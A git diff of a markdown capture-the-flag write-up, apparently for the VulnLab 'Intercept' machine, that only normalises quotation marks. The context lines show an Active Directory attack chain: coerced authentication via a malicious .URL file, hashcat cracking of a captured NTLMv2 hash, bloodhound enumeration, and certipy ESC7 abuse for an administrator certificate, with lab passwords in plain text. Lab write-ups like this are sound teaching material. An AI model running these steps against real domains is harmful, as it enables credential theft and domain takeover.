@@ -22,11 +22,11 @@ Starting off I added the following to the /etc/hosts file:
 I started off with some nmap scans and quickly noticed that it was possible to access the dev share using an SMB null session.
 ![_install](/assets/img/VL-Intercept/null_session_dev.png)
 
-Using this, I entered the “dev” share and looked through the directories for interesting information.
+Using this, I entered the "dev" share and looked through the directories for interesting information.
 
 ![_install](/assets/img/VL-Intercept/null_session_dev_2.png)
 
-Something that stood out to me is that there is a “readme.txt” file which says that the share is checked regularly for updates. This immediately made me think of “coerced authentication” being a possibility. We can craft a malicious .URL file that triggers an authentication request to our SMB listener when someone accesses the share. We can then attempt to relay or crack the authentication request. I crafted the following .URL payload:
+Something that stood out to me is that there is a "readme.txt" file which says that the share is checked regularly for updates. This immediately made me think of "coerced authentication" being a possibility. We can craft a malicious .URL file that triggers an authentication request to our SMB listener when someone accesses the share. We can then attempt to relay or crack the authentication request. I crafted the following .URL payload:
 
 ```bash
 [InternetShortcut]
@@ -52,11 +52,11 @@ Despite SMB Signing being enabled by default on the Domain Controller, which pre
 ```bash
 hashcat -a 0 -m 5600 hash.txt /opt/rockyou.txt
 ```
-This successfully recovered the password which ended up being “Chocolate1”. 
+This successfully recovered the password which ended up being "Chocolate1". 
 ![_install](/assets/img/VL-Intercept/cracked_hash.png)
 
 ## Domain Enumeration
-Now that we have a valid Domain account we can enumerate the domain using bloodhound. Let’s run the python remote ingester to collect some data:
+Now that we have a valid Domain account we can enumerate the domain using bloodhound. Let's run the python remote ingester to collect some data:
 
 ```bash
 bloodhound.py -d intercept.vl -v --zip -c All -dc DC01.intercept.vl -ns 10.10.185.69 -u 'Kathryn.spencer' -p 'Chocolate1' --dns-timeout 10
@@ -67,7 +67,7 @@ The user Kathryn.Spencer doesn’t have any interesting outbound permissions.
 
 ![_install](/assets/img/VL-Intercept/bloodhound_enum.png)
 
-I continued to enumerate the Domain and figured out that the MachineAccountQuota has the default setting of “10”.
+I continued to enumerate the Domain and figured out that the MachineAccountQuota has the default setting of "10".
 ![_install](/assets/img/VL-Intercept/maq.png)
 
 And also figured out that the Domain Controller doesn’t have LDAP Signing enforced:
@@ -149,7 +149,7 @@ Having the manage certificate rights we can validate the failed request since we
 certipy ca -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.185.69 -ca 'intercept-DC01-CA' -issue-request 5
 ```
 ![_install](/assets/img/VL-Intercept/esc7-p4.png)
-Now that the certificate is issued we can retrieve the administrator’s certificate:
+Now that the certificate is issued we can retrieve the administrator's certificate:
 ```bash
 certipy req -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.185.69 -ca 'intercept-DC01-CA' -target intercept.vl -retrieve 5
 ```
